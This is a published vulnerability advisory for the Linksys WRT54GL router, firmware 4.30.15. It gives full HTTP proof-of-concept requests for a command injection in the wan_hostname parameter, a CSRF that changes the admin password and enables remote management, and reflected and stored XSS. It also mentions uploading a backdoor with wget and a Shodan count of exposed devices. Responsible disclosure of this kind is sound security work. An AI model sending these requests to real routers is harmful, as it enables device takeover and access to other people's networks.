@@ -1,0 +1,139 @@
+Device Name: Linksys WRT54GL v1.1
+Vendor: Linksys/Cisco
+
+============ Vulnerable Firmware Releases: ============
+
+Firmware Version: 4.30.15 build 2, 01/20/2011
+
+============ Device Description: ============
+
+The Router lets you access the Internet via a wireless connection, broadcast at up to 54 Mbps, or through one of its four switched ports. You can also use the Router to share resources such as computers, printers and files. A variety of security features help to protect your data and your privacy while online. Security features include WPA2 security, a Stateful Packet Inspection (SPI) firewall and NAT technology. Configuring the Router is easy using the provided browser-based utility.
+
+Source: http://homesupport.cisco.com/en-us/support/routers/WRT54GL
+
+============ Shodan Torks ============
+
+Shodan Search: WRT54GL
+=> Results 27190 devices
+
+============ Vulnerability Overview: ============
+
+* OS Command Injection
+=> parameter: wan_hostname
+=> command: `%20ping%20192%2e168%2e178%2e101%20`
+
+The vulnerability is caused by missing input validation in the wan_hostname parameter and can be exploited to inject and execute arbitrary shell commands. With wget it is possible to upload and execute a backdoor to compromise the device.
+You need to be authenticated to the device or you have to find other methods for inserting the malicious commands.
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/OS-Command-Injection-param_wan_hostname.png
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.166
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.166/index.asp
+Authorization: Basic xxxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 734
+Connection: close
+
+submit_button=index&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=test&wan_hostname=`%20ping%20192%2e168%2e178%2e101%20`&wan_domain=test&mtu_enable=1&wan_mtu=1500&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=178&lan_ipaddr_3=166&lan_netmask=255.255.255.0&lan_proto=dhcp&dhcp_check=&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1
+
+=> Change the request method from HTTP Post to HTTP GET makes the exploitation easier:
+
+http://192.168.178.166/apply.cgi?submit_button=index&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=test&wan_hostname=`%20ping%20192%2e168%2e178%2e101%20`&wan_domain=test&mtu_enable=1&wan_mtu=1500&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=178&lan_ipaddr_3=166&lan_netmask=255.255.255.0&lan_proto=dhcp&dhcp_check=&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1
+
+=> This setting is placed permanent into the configuration and so it gets executed on every bootup process of the device.
+
+* For changing the current password there is no request to the current password
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.166
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.166/Management.asp
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 299
+
+submit_button=Management&change_action=&action=Apply&PasswdModify=1&remote_mgt_https=0&http_enable=1&https_enable=0&wait_time=4&need_reboot=0&http_passwd=pwnd&http_passwdConfirm=pwnd&_http_enable=1&web_wl_filter=0&remote_management=1&http_wanport=8080&upnp_enable=1&upnp_config=1&upnp_internet_dis=0
+
+* CSRF for changing the password without knowing the current one and the attacker is able to activate the remote management:
+
+http://<IP>/apply.cgi?submit_button=Management&change_action=&action=Apply&PasswdModify=1&remote_mgt_https=0&http_enable=1&https_enable=0&wait_time=4&need_reboot=0&http_passwd=pwnd1&http_passwdConfirm=pwnd1&_http_enable=1&web_wl_filter=0&remote_management=1&http_wanport=8080&upnp_enable=1&upnp_config=1&upnp_internet_dis=0
+
+* reflected XSS
+
+=> parameter: submit_button
+
+Injecting scripts into the parameter submit_button reveals that this parameter is not properly validated for malicious input.
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/reflected-XSS-01.png
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.166
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.166/Wireless_Basic.asp
+Authorization: Basic xxxx=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
+
+submit_button=Wireless_Basic'%3balert('pwnd')//&action=Apply&submit_type=&change_action=&next_page=&wl_net_mode=mixed&wl_ssid=test&wl_channel=6&wl_closed=0
+
+* stored XSS (Access Restrictions -> Richtliniennamen eingeben (place the XSS) -> Zusammenfassung (Scriptcode gets executed)
+
+=> parameter: f_name
+
+Injecting scripts into the parameter f_name reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods like CSRF for inserting the malicious JavaScript code.
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/stored-XSS-Filters.png
+
+=> Change the request methode from HTTP Post to HTTP GET makes the exploitation easier:
+
+
+http://192.168.178.166/apply.cgi?submit_button=Filters&change_action=&submit_type=save&action=Apply&blocked_service=&filter_web=&filter_policy=&f_status=0&f_id=1&f_status1=disable&f_name=123"><img%20src%3d"0"%20onerror%3dalert("XSSed1")>&f_status2=allow&day_all=1&time_all=1&allday=&blocked_service0=None&blocked_service1=None&host0=&host1=&host2=&host3=&url0=&url1=&url2=&url3=&url4=&url5=
+
+============ Solution ============
+
+Upgrade your router to the latest firmware version with fixes for XSS and OS Command Injection vulnerabilities.
+
+Fixed Version: Ver.4.30.16 (Build 2)
+Available since 10.01.2013
+
+Download: http://homesupport.cisco.com/en-eu/support/routers/WRT54GL
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-001
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+September 2012 - discovered vulnerability
+03.10.2012 - Contacted Linksys and give them detailed vulnerability details
+03.10.2012 - Linksys responded with a case number
+11.10.2012 - Status update from Linksys
+23.10.2012 - Linksys requested to sign the Beta Agreement for testing the Beta Firmware
+29.10.2012 - Send the Beta Agreement back
+29.10.2012 - Linksys gives access to the new Beta Firmware
+30.10.2012 - Checked the new firmware and verified that the discovered XSS and OS Command Injection vulnerabilities are fixed
+30.10.2012 - Linksys responded that there is no ETA of the new firmware
+17.01.2013 - Linksys informed me about the public release of mostly fixed version (XSS, OS Command Injection fixed)
+18.01.2013 - public release
+===================== Advisory end =====================
